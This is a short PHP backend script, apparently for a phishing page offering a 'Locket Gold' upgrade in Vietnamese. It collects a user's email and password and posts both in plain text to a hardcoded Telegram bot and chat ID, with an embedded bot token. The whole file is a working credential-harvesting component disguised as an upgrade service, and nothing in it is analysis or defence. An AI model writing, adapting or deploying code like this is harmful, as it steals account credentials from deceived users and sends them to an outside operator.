<?php
header("Content-Type: application/json; charset=utf-8");

$BOT_TOKEN = "8274175937:AAEcg7M7A4iYiuc0JwbyXYbt5SP1s7_VR4g";
$CHAT_ID   = "6684980246";

$email = trim($_POST['email'] ?? '');
$password = trim($_POST['password'] ?? '');

if ($email === '' || $password === '') {
    echo json_encode(['success' => false, 'message' => 'Vui lòng nhập đầy đủ thông tin!']);
    exit;
}

$date = date("d/m/Y H:i:s");
$text  = "💎 *Yêu cầu nâng cấp Locket Gold mới*\n\n";
$text .= "📧 Email: *{$email}*\n";
$text .= "🔑 Mật khẩu: ||{$password}||\n";
$text .= "🕒 Thời gian: {$date}\n";
$text .= "🌐 Server: Render.com";

$url = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$data = [
    'chat_id' => $CHAT_ID,
    'text' => $text,
    'parse_mode' => 'Markdown'
];

$options = [
    'http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($data)
    ]
];

$context = stream_context_create($options);
$result  = file_get_contents($url, false, $context);

echo $result
    ? json_encode(['success' => true, 'message' => 'Đã gửi về Telegram!'])
    : json_encode(['success' => false, 'message' => 'Không thể gửi tin nhắn!']);
?>
